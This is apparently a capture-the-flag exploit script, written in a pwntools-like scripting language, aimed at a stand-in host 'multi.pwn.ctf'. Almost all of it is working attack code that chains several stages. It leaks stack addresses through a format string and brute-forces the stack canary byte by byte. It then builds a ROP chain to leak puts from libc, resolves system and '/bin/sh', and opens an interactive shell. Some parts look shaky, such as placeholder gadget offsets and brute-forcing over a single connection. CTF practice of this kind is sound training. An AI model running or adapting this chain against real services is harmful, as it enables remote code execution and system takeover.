# Multi-stage exploitation - chaining multiple vulns
# Realistic CTF scenario with multiple steps

let host = "multi.pwn.ctf"
let port = 31337

print("[*] Multi-Stage PWN Challenge")
print("[*] Target:", host, ":", port)

# Stage 1: Information Disclosure
print("\n[STAGE 1] Information Disclosure")
print("==================================================")

let conn = connect(host, port)

# Send info leak trigger
send(conn, "INFO")
let banner = recv_until(conn, "\n")

# Parse banner for useful info
let version_match = regex_find("v([0-9.]+)", banner)
print("[+] Binary version:", version_match)

# Trigger stack leak via format string
send(conn, "%p.%p.%p.%p.%p.%p")
let stack_leak = recv_until(conn, "\n")
let leaked_addrs = split(stack_leak, ".")

print("[+] Leaked stack addresses:")
for addr in leaked_addrs {
    print("   ", addr)
}
# Extract useful addresses
let stack_addr = int(leaked_addrs[0], 16)
let code_addr = int(leaked_addrs[3], 16)

print("[+] Stack address:", hex(stack_addr))
print("[+] Code address:", hex(code_addr))

# Calculate PIE base if enabled
let pie_base = code_addr & 0xfffffffffffff000
print("[+] PIE base:", hex(pie_base))

# Stage 2: Bypass Canary
print("\n[STAGE 2] Canary Bypass")
print("==================================================")

# Fork server preserves canary - brute force byte by byte
define function leak_canary() {
    let canary = []
    let offset = 40  # Offset to canary
    
    # Canary first byte is always 0x00
    canary = [0x00]
    
    # Brute force remaining 7 bytes
    for byte_pos in range(1, 8) {
        for guess in range(0, 256) {
            let payload = "A" * offset + bytes(canary) + bytes([guess])
            
            send(conn, payload)
            let response = recv(conn, 1024, timeout: 1)
            let resp_str = str(response)
            
            # If no error in response, this byte is correct
            if "Success" in resp_str or ("Error" in resp_str) == false {
                # Correct byte, server didn't crash
                canary = canary + [guess]
                print("[+] Canary byte", byte_pos, ":", hex(guess))
                break
            }
        }
    }
    return canary
}
let canary = leak_canary()
print("[+] Full canary:", hex(canary))

# Stage 3: ROP Chain with Leaked Addresses
print("\n[STAGE 3] ROP Chain Construction")
print("==================================================")

# Gadgets relative to PIE base
let pop_rdi = pie_base + 0x1337
let pop_rsi_r15 = pie_base + 0x1339
let ret = pie_base + 0x1016

# Calculate addresses
let plt_puts = pie_base + 0x1040
let got_puts = pie_base + 0x4018
let main = pie_base + 0x1200

print("[*] Gadget addresses:")
print("    pop rdi:", hex(pop_rdi))
print("    pop rsi; pop r15:", hex(pop_rsi_r15))
print("    ret:", hex(ret))

# Build leak chain
let leak_chain = [
    pop_rdi, got_puts,
    plt_puts,
    main  # Return to main for second stage
]

# Stage 4: Build Full Exploit
print("\n[STAGE 4] Full Exploit Assembly")
print("==================================================")

let offset = 40
let payload = "A" * offset
payload = payload + bytes(canary)
payload = payload + "B" * 8  # Saved RBP

# Add ROP chain
for gadget in leak_chain {
    payload = payload + p64(gadget)
}
send(conn, payload)

# Receive libc leak
let leaked_puts = recv(conn, 8)
let puts_addr = u64(leaked_puts)
print("[+] Leaked puts@libc:", hex(puts_addr))

# Calculate libc base dynamically
let libc_template = Libc("ubuntu20.04")
let puts_offset = libc_template.symbols.puts
let libc_base = puts_addr - puts_offset

let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
let system = libc_resolved.symbols.system
let bin_sh = libc_resolved.strings.bin_sh

print("[+] Libc base:", hex(libc_base))
print("[+] system():", hex(system))
print("[+] /bin/sh:", hex(bin_sh))

# Stage 5: Final Shell
print("\n[STAGE 5] Shell Exploitation")
print("==================================================")

# Build final payload with system("/bin/sh")
let final_payload = "A" * offset
final_payload = final_payload + bytes(canary)
final_payload = final_payload + "B" * 8

# Final ROP: system("/bin/sh")
final_payload = final_payload + p64(ret)  # Stack alignment
final_payload = final_payload + p64(pop_rdi)
final_payload = final_payload + p64(bin_sh)
final_payload = final_payload + p64(system)

send(conn, final_payload)

print("[+] Final exploit sent!")
print("[+] Dropping to interactive shell...")

# Verify shell
send(conn, "id\n")
let shell_check = recv(conn, 1024)

if "uid=" in str(shell_check) {
    print("[+] SUCCESS! Got shell!")
    interactive(conn)
} else {
    print("[-] Shell failed, debugging required")
}
